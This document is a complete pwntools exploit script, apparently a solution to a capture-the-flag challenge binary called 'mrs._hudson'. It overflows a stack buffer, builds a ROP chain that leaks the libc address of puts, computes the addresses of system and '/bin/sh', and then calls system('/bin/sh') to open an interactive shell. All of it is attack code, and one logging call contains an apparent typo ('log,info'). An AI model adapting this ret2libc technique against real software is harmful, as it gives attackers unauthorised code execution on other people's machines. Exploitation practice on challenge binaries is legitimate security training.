from pwn import *

p = ELF('./mrs._hudson')
rop = ROP(p)
r = process('./mrs._hudson')
libc = ELF('libc6-amd64_2.31-6_i386.so')
r.recvline()

popret = rop.find_gadget(['pop rdi', 'ret'])[0]
main = p.symbols['main']
putsplt = p.plt['puts']
putsgot = p.got['puts']
junk = b'X'*120
ropchain = b''
ropchain += p64(popret)
ropchain += p64(putsgot)
ropchain += p64(putsplt)
ropchain += p64(main)

r.sendline(junk + ropchain)
puts = u64(r.recv(0x6).ljust(8, b'\x00'))
libcbase = puts - libc.symbols['puts']
system = libcbase + libc.symbols['system']
binsh = libcbase + next(libc.search(b'/bin/sh\x00'))
r.recvline()
log.info("LEAK PLT 0x%x" %putsplt)
log.info("LEAK GOT 0x%x" %putsgot)
log.info("LEAK PUTS 0x%x" %puts)
log.info("LIBC BASE 0x%x" %libcbase)
log.info("SYSTEM 0x%x" %system)
log,info("/BIN/SH 0x%x" %binsh)

r.sendline(junk + p64(popret) + p64(binsh) + p64(system))
r.interactive()